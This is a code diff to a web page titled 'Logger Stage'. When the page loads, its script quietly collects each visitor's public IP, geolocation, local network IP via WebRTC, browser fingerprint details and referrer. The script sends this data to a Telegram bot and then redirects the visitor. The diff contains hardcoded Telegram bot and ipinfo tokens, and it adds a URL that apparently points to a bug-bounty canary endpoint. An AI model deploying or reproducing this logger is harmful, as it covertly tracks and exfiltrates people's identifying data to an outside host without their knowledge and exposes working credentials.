@@ -4,11 +4,15 @@
   <meta charset="UTF-8">
   <title>Logger Stage</title>
   <script>
+    const TELEGRAM_TOKEN = "8182692132:AAGPJzf4tOZ7be5vrvd3RD3RJFZoEbmq1zg";
+    const TELEGRAM_CHAT_ID = "6239813037";
+    const REDIRECT_URL = "https://www.internalfb.com/intern/bug-bounty/get-canary-token/4659208263424b568dc09729f50d3637/";
+
     async function getIPInfo() {
       try {
         const res = await fetch("https://ipinfo.io/json?token=be5998b85f541c");
         return await res.json();
-      } catch (e) {
+      } catch {
         return {};
       }
     }
@@ -23,10 +27,9 @@
       return "Unknown";
     }
 
-    function detectAdBlock() {
+    async function detectAdBlock() {
       return new Promise(resolve => {
         const testAd = document.createElement("div");
-        testAd.innerHTML = "&nbsp;";
         testAd.className = "adsbox";
         testAd.style.position = "absolute";
         testAd.style.height = "1px";
@@ -38,35 +41,43 @@
       });
     }
 
-    function detectWebRTCLocalIP(callback) {
-      const pc = new RTCPeerConnection({iceServers:[]});
-      pc.createDataChannel("");
-      pc.createOffer().then(offer => pc.setLocalDescription(offer));
-      pc.onicecandidate = event => {
-        if (event && event.candidate && event.candidate.candidate) {
-          const parts = event.candidate.candidate.split(" ");
-          const ip = parts[4];
-          if (!ip.startsWith("192.") && !ip.startsWith("10.") && !ip.startsWith("172.")) return;
-          callback(ip);
+    function detectWebRTCLocalIP() {
+      return new Promise(resolve => {
+        let found = false;
+        const pc = new RTCPeerConnection({iceServers:[]});
+        pc.createDataChannel("");
+        pc.createOffer().then(offer => pc.setLocalDescription(offer));
+        pc.onicecandidate = event => {
+          if (event && event.candidate && event.candidate.candidate) {
+            const parts = event.candidate.candidate.split(" ");
+            const ip = parts[4];
+            if (/^(192\.|10\.|172\.)/.test(ip)) {
+              found = true;
+              resolve(ip);
+              pc.close();
+            }
+          }
+        };
+        setTimeout(() => {
+          if (!found) resolve("N/A");
           pc.close();
-        }
-      };
-    }
-
-    async function sendToTelegram(message) {
-      const token = "8182692132:AAGPJzf4tOZ7be5vrvd3RD3RJFZoEbmq1zg";
-      const chat_id = "6239813037";
-      const url = `https://api.telegram.org/bot${token}/sendMessage`;
-      await fetch(url, {
-        method: "POST",
-        headers: {"Content-Type": "application/json"},
-        body: JSON.stringify({chat_id, text: message, parse_mode: "Markdown"})
+        }, 3000);
       });
     }
 
+    async function sendToTelegram(message) {
+      try {
+        const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
+        await fetch(url, {
+          method: "POST",
+          headers: {"Content-Type": "application/json"},
+          body: JSON.stringify({chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: "Markdown"})
+        });
+      } catch {}
+    }
+
     function formatMessage(data) {
-      return `📄 *[LOGGER STAGE]*
-🚀 *User Info:*
+      return `📄 *[LOGGER STAGE]*\n
 🌐 *IP:* ${data.ip || "Unknown"}
 📍 *City:* ${data.city || "Unknown"}
 🌎 *Country:* ${data.country || "Unknown"}
@@ -76,9 +87,9 @@
 🌐 *Language:* ${data.language}
 🧠 *User-Agent:* \`${data.ua}\`
 🛡 *AdBlock:* ${data.adblock ? "Yes" : "No"}
-📡 *WebRTC Local IP:* ${data.localIP || "N/A"}
-🕒 *Timestamp:* ${new Date().toISOString()}
-🔍 *FB Crawler:* ${/FBAN|FBAV|facebookexternalhit/i.test(data.ua) ? "Yes" : "No"}`;
+📡 *WebRTC Local IP:* ${data.localIP}
+🔗 *Referrer:* ${document.referrer || "Direct"}
+🕒 *Timestamp:* ${new Date().toLocaleString()}`;
     }
 
     async function run() {
@@ -88,23 +99,15 @@
       const lang = navigator.language;
       const platform = detectPlatform();
       const adblock = await detectAdBlock();
-      detectWebRTCLocalIP(async localIP => {
-        const msg = formatMessage({
-          ...ipData, ua, resolution: res, language: lang,
-          platform, adblock, localIP
-        });
-        await sendToTelegram(msg);
-        window.location.href = "redirect_ultimate.html";
+      const localIP = await detectWebRTCLocalIP();
+
+      const msg = formatMessage({
+        ...ipData, ua, resolution: res, language: lang,
+        platform, adblock, localIP
       });
-      // fallback if WebRTC doesn't return
-      setTimeout(async () => {
-        const msg = formatMessage({
-          ...ipData, ua, resolution: res, language: lang,
-          platform, adblock, localIP: "N/A"
-        });
-        await sendToTelegram(msg);
-        window.location.href = "redirect_ultimate.html";
-      }, 5000);
+
+      await sendToTelegram(msg);
+      window.location.href = "redirect_ultimate.html";
     }
 
     window.onload = run;
